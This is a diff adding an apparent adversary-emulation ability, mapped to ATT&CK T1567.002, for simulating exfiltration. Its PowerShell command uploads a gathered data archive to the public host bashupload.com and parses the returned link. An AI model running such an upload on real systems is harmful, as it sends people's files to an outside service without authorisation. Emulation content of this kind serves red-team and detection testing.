@@ -1,0 +1,32 @@
+- id: b2c3d4e5-f6g7-h8i9-j0k1-exfiltrate-data
+  name: Exfiltration - Upload Archive to Cloud Service
+  description: Simulates exfiltration by uploading the consolidated data archive to a generic HTTP endpoint, generating network traffic.
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+        - source: file.archive.path
+  platforms:
+    windows:
+      psh:
+        command: |
+          $archivePath = "#{file.archive.path}";
+          $uploadUrl = "https://bashupload.com/datapackage.zip";
+
+          $status =Invoke-WebRequest -Uri $uploadUrl -Method Post -InFile $archivePath -Headers @{
+              "Content-Type" = "application/zip"
+          };
+
+          if ($status.StatusCode -eq 200) {
+              Write-Host $status.Content;
+          } else {
+              Write-Error "Exfiltration failed with status code: $($status.StatusCode)";
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'exfil.url'
+              custom_parser_vals:
+                regex: 'wget (https:\/\/bashupload\.com\/.*\/datapackage\.zip)'
+                edge_label: 'exfiltration_completed'
